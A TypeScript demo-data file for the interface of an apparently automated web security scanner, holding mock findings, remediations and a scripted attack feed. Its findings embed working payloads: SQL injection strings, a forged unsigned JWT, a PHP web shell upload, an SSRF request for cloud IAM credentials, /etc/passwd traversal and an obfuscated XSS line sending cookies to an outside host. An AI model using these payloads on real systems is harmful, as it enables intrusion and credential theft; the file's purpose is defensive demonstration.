// Static demo data ported from the design. Later this is replaced by live data
// from the Python engine (scan results + attack feed) via the IPC bridge.

import type { Severity } from "./theme";

export const AGENTS = [
  "ReconBot", "Injector", "AuthBreaker", "IDORHunter", "CrawlerBot", "Fuzzer",
  "HeaderPoker", "FileAttacker", "RaceCondition", "SSRFProber", "XSSHunter",
  "WebSocketAgent", "GraphQLAgent",
] as const;

export type AgentName = (typeof AGENTS)[number];

export const DESC: Record<string, string> = {
  ReconBot: "maps endpoints",
  Injector: "SQL & command injection",
  AuthBreaker: "auth & JWT flaws",
  IDORHunter: "broken object access",
  CrawlerBot: "route discovery",
  Fuzzer: "parameter fuzzing",
  HeaderPoker: "header & CORS abuse",
  FileAttacker: "upload & traversal",
  RaceCondition: "concurrency flaws",
  SSRFProber: "server-side requests",
  XSSHunter: "cross-site scripting",
  WebSocketAgent: "socket hijacking",
  GraphQLAgent: "schema introspection",
};

export interface AgentState {
  status: "queued" | "running" | "complete";
  sent: number;
  confirmed: number;
  progress: number;
}

export interface FeedLine {
  agent: string;
  text: string;
  sev: "ok" | "high" | "crit";
  id: number;
}

export interface Finding {
  id: number;
  severity: Severity;
  name: string;
  endpoint: string;
  agent: string;
  cvss: string;
  whatIs: string;
  request: string;
  response: string;
  repro: string;
  fix: string;
  file?: string | null;
  line?: number | null;
}

const xss =
  '{"body":"<scr' + "ipt>fetch('//x/?'+document.cookie)</scr" + 'ipt>"}';

export const FINDINGS: Finding[] = [
  { id: 1, severity: "CRITICAL", name: "SQL Injection", endpoint: "/api/users?search=", agent: "Injector", cvss: "9.8",
    whatIs: "The search parameter is concatenated directly into a SQL query. Argus dumped the entire users table by closing the string literal and appending a tautology — no authentication required.",
    request: "GET /api/users?search=' OR 1=1-- HTTP/1.1\nHost: ecommerce-app.internal",
    response: '200 OK\n{"users":[{"id":1,"email":"admin@..."}, ...847 records...]}',
    repro: "1. Send GET /api/users?search=' OR 1=1--\n2. Observe full table returned\n3. Escalate with UNION SELECT to read other tables",
    fix: "- db.query(`SELECT * FROM users WHERE name LIKE '%${q}%'`)\n+ db.query('SELECT * FROM users WHERE name LIKE ?', [`%${q}%`])" },
  { id: 2, severity: "CRITICAL", name: "Auth Bypass via JWT none algorithm", endpoint: "/api/admin", agent: "AuthBreaker", cvss: "9.1",
    whatIs: "The token verifier accepts the 'none' algorithm, so a forged unsigned JWT with an elevated role grants full admin access without any secret.",
    request: "GET /api/admin HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    response: '200 OK\n{"role":"admin","panel":"unlocked"}',
    repro: '1. Craft header {"alg":"none"}\n2. Set payload {"role":"admin"}\n3. Send with empty signature -> admin granted',
    fix: "- jwt.verify(token, key)\n+ jwt.verify(token, key, { algorithms: ['HS256'] })" },
  { id: 3, severity: "CRITICAL", name: "Remote Code Execution via File Upload", endpoint: "/api/upload", agent: "FileAttacker", cvss: "9.0",
    whatIs: "Upload validation only checks the Content-Type header. A polyglot file with a .php extension was stored in a web-served directory and executed on request.",
    request: "POST /api/upload HTTP/1.1\nContent-Type: image/png\n\n<?php system($_GET[0]); ?>",
    response: '200 OK\n{"path":"/uploads/shell.php"}',
    repro: "1. Upload shell.php as image/png\n2. GET /uploads/shell.php?0=id\n3. Command output returned",
    fix: "+ Validate magic bytes, not Content-Type\n+ Store outside web root, randomise names, strip extensions" },
  { id: 4, severity: "HIGH", name: "IDOR on order records", endpoint: "/api/orders/:id", agent: "IDORHunter", cvss: "8.1",
    whatIs: "Order objects are addressed by sequential integer IDs with no ownership check, letting any authenticated user read other customers' orders.",
    request: "GET /api/orders/10472 HTTP/1.1\nAuthorization: Bearer <low-priv-user>",
    response: '200 OK\n{"id":10472,"owner":"other@user.com","total":"$4,210"}',
    repro: "1. Authenticate as any user\n2. Increment :id\n3. Read foreign orders",
    fix: "+ if (order.userId !== req.user.id) return res.status(403)" },
  { id: 5, severity: "HIGH", name: "SSRF to AWS Metadata", endpoint: "/api/fetch?url=", agent: "SSRFProber", cvss: "7.5",
    whatIs: "A server-side fetch follows arbitrary user URLs, allowing requests to the cloud metadata endpoint and exfiltration of IAM credentials.",
    request: "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/ HTTP/1.1",
    response: '200 OK\n{"AccessKeyId":"ASIA...","SecretAccessKey":"..."}',
    repro: "1. Point url= at 169.254.169.254\n2. Read IAM role credentials\n3. Assume role",
    fix: "+ Allow-list outbound hosts; block link-local + private ranges" },
  { id: 6, severity: "HIGH", name: "Stored XSS", endpoint: "/api/comments", agent: "XSSHunter", cvss: "7.4",
    whatIs: "Comment bodies are rendered without encoding, so an injected script executes in every viewer's session — including admins.",
    request: "POST /api/comments\n" + xss,
    response: "201 Created — payload persisted and served to all viewers",
    repro: "1. Post comment with script\n2. Load thread as another user\n3. Cookie exfiltrated",
    fix: "+ Encode on output; apply a strict Content-Security-Policy" },
  { id: 7, severity: "HIGH", name: "CORS Misconfiguration", endpoint: "All endpoints", agent: "HeaderPoker", cvss: "7.2",
    whatIs: "The API reflects any Origin and sets Allow-Credentials: true, letting malicious sites make authenticated cross-origin requests on a victim's behalf.",
    request: "GET /api/profile HTTP/1.1\nOrigin: https://evil.example",
    response: "Access-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true",
    repro: "1. Host page on evil.example\n2. fetch with credentials:include\n3. Read response cross-origin",
    fix: "+ Reflect Origin only from a strict allow-list" },
  { id: 8, severity: "MEDIUM", name: "Race Condition on voucher redemption", endpoint: "/api/redeem", agent: "RaceCondition", cvss: "5.9",
    whatIs: "Redemption reads then writes voucher state without a lock, so concurrent requests redeem a single-use voucher multiple times.",
    request: '20x POST /api/redeem {"code":"SAVE50"} (parallel)',
    response: "200 OK x7 — voucher applied seven times",
    repro: "1. Fire 20 parallel redeem requests\n2. Several succeed before the flag is set",
    fix: "+ SELECT ... FOR UPDATE / atomic compare-and-set on redeemed flag" },
  { id: 9, severity: "MEDIUM", name: "Path Traversal", endpoint: "/api/files/download", agent: "FileAttacker", cvss: "5.4",
    whatIs: "The file parameter is joined to a base path without normalisation, allowing ../ sequences to read files outside the intended directory.",
    request: "GET /api/files/download?file=../../../../etc/passwd",
    response: "200 OK\nroot:x:0:0:root:/root:/bin/bash ...",
    repro: "1. Supply ../ traversal in file=\n2. Read arbitrary server files",
    fix: "+ path.normalize + verify resolved path stays within base dir" },
  { id: 10, severity: "LOW", name: "Missing security headers", endpoint: "All responses", agent: "Static scan", cvss: "3.1",
    whatIs: "Responses omit HSTS, X-Content-Type-Options and a Content-Security-Policy, weakening defence-in-depth against downgrade and sniffing attacks.",
    request: "GET / HTTP/1.1",
    response: "200 OK — no Strict-Transport-Security, no CSP, no X-Content-Type-Options",
    repro: "1. Inspect any response headers\n2. Note missing hardening headers",
    fix: "+ Add helmet() / equivalent middleware to set security headers" },
];

export const AUDITS = [
  { name: "github.com/user/ecommerce-app", score: 74, time: "2h ago" },
  { name: "github.com/user/rest-api", score: 23, time: "1d ago" },
  { name: "/local/fintech-backend", score: 91, time: "3d ago" },
];

export const STATS = [
  { label: "TOTAL SCANS", value: "14", color: "#D4A853" },
  { label: "VULNS FOUND", value: "247", color: "#D4A853" },
  { label: "CRITICAL", value: "18", color: "#8B0000" },
  { label: "FIXED", value: "9", color: "#CD7F32" },
];

export const PROVIDERS = [
  { name: "Local GPU", speed: "12 t/s" },
  { name: "Groq", speed: "280 t/s" },
  { name: "Gemini", speed: "90 t/s" },
  { name: "Claude", speed: "55 t/s" },
  { name: "OpenRouter", speed: "varies" },
];

// The scripted live-attack timeline (ported verbatim from the design).
export interface TimelineEvent {
  f: [string, string, "ok" | "high" | "crit"];
  a?: [string, Partial<AgentState>];
  act?: number;
  risk?: number;
  conf?: number;
}

export const TIMELINE: TimelineEvent[] = [
  { f: ["RECONBOT", "mapped 14 endpoints across 3 routers", "ok"], a: ["ReconBot", { status: "complete", sent: 14, progress: 100 }], act: 1 },
  { f: ["INJECTOR", "testing /api/users?search= ...", "ok"], a: ["Injector", { status: "running", sent: 12, progress: 24 }], act: 1 },
  { f: ["INJECTOR", "payload: ' OR '1'='1'-- ", "ok"], a: ["Injector", { status: "running", sent: 24, progress: 46 }] },
  { f: ["INJECTOR", "SQLi — 847 records dumped", "crit"], a: ["Injector", { status: "running", sent: 47, progress: 72, confirmed: 3 }], risk: 28, conf: 3 },
  { f: ["AUTHBREAKER", "trying JWT alg:none on /api/admin ...", "ok"], a: ["AuthBreaker", { status: "running", sent: 8, progress: 30 }], act: 1 },
  { f: ["AUTHBREAKER", "auth bypass confirmed", "crit"], a: ["AuthBreaker", { status: "running", sent: 23, progress: 62, confirmed: 1 }], risk: 22, conf: 1 },
  { f: ["IDORHUNTER", "creating test accounts ...", "ok"], a: ["IDORHunter", { status: "running", sent: 12, progress: 34 }], act: 1 },
  { f: ["IDORHUNTER", "enumerating /api/orders/:id ...", "ok"], a: ["IDORHunter", { status: "running", sent: 34, progress: 58 }] },
  { f: ["IDORHUNTER", "IDOR — accessed 12 foreign orders", "high"], a: ["IDORHunter", { status: "complete", sent: 41, progress: 100, confirmed: 1 }], risk: 9, conf: 1 },
  { f: ["INJECTOR", "sweep complete — 3 confirmed", "ok"], a: ["Injector", { status: "complete", progress: 100 }] },
  { f: ["SSRFPROBER", "probing /api/fetch?url= for internal reach ...", "ok"], a: ["SSRFProber", { status: "running", sent: 9, progress: 42 }], act: 1 },
  { f: ["SSRFPROBER", "SSRF to 169.254.169.254 metadata", "high"], a: ["SSRFProber", { status: "complete", sent: 18, progress: 100, confirmed: 1 }], risk: 8, conf: 1 },
  { f: ["XSSHUNTER", "injecting stored payloads into /api/comments ...", "ok"], a: ["XSSHunter", { status: "running", sent: 15, progress: 48 }], act: 1 },
  { f: ["XSSHUNTER", "stored XSS — payload persisted", "high"], a: ["XSSHunter", { status: "complete", sent: 29, progress: 100, confirmed: 1 }], risk: 7, conf: 1 },
  { f: ["CRAWLERBOT", "crawled 96 routes — surface map updated", "ok"], a: ["CrawlerBot", { status: "complete", sent: 96, progress: 100 }], act: 1 },
  { f: ["FILEATTACKER", "uploading polyglot to /api/upload ...", "ok"], a: ["FileAttacker", { status: "running", sent: 6, progress: 36 }], act: 1 },
  { f: ["FILEATTACKER", "RCE via file upload", "crit"], a: ["FileAttacker", { status: "complete", sent: 14, progress: 100, confirmed: 1 }], conf: 1 },
  { f: ["HEADERPOKER", "CORS allows arbitrary origin", "high"], a: ["HeaderPoker", { status: "complete", sent: 31, progress: 100, confirmed: 1 }], act: 1, conf: 1 },
  { f: ["FUZZER", "fuzzing parameters across 14 endpoints ...", "ok"], a: ["Fuzzer", { status: "running", sent: 212, progress: 55 }], act: 1 },
  { f: ["AUTHBREAKER", "sweep complete", "ok"], a: ["AuthBreaker", { status: "complete", progress: 100 }] },
];
